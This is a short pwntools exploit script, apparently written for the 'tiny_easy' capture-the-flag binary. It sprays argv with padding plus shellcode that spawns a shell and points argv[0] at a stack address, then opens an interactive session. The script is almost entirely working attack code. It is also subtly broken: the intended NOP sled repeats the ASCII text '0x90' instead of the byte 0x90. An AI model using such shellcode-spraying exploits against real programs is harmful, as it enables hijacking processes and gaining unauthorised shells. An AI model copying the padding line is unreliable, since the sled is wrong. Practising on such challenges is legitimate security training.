from pwn import *

# Specify the binary
binary_path = './tiny_easy'

# Define the custom argv array
argv = [b'\xbc\xcf\xc7\xff']
padding = b'0x90' * 10000

paylod = padding + asm(shellcraft.sh())

for _ in range(20):
    argv.append(paylod)

# Start the process with the modified argv
p = process(executable=binary_path, argv=argv)
p.interactive()
#response = p.recv()
#print(response)
